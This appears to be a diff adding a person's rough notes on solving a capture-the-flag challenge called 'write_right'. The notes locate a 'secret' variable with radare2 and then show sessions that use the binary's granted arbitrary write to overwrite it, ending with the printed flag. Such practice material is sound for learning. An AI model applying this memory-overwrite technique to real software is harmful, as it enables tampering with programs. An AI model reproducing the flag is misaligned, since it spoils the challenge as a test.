@@ -1,0 +1,34 @@
+r2 at 0x080485f4:
+a1509a0408     mov eax, dword [sym.secret]     ; [0x8049a50:4]=0xdeadbeef  ; sym.secret
+
+
+one of these is pointer to secret?
+
+ecx            0xf7fd8000  no
+edx            0xf7fca898  causes some loop not to exit?
+ebx            0xf7fc9000  no
+
+(dunno wtf i was doing here)
+
+./write_right
+Welcome! I will grant you one arbitrary write!
+Where do you want to write to? 0x8049a50
+Okay! What do you want to write there? 0x1337beef
+Writing 0x1337beef to 0x8049a50...
+Value written!
+Woah! You changed my secret!
+I guess this means you get a flag now...
+test
+
+binaries rotate, so 0x8049a50 worked on local copy but not on server
+0x804a03c in wr2
+
+pico@shell:/home/write_right$ ./write_right
+Welcome! I will grant you one arbitrary write!
+Where do you want to write to? 0x804a03c
+Okay! What do you want to write there? 0x1337beef
+Writing 0x1337beef to 0x804a03c...
+Value written!
+Woah! You changed my secret!
+I guess this means you get a flag now...
+arbitrary_write_is_always_right
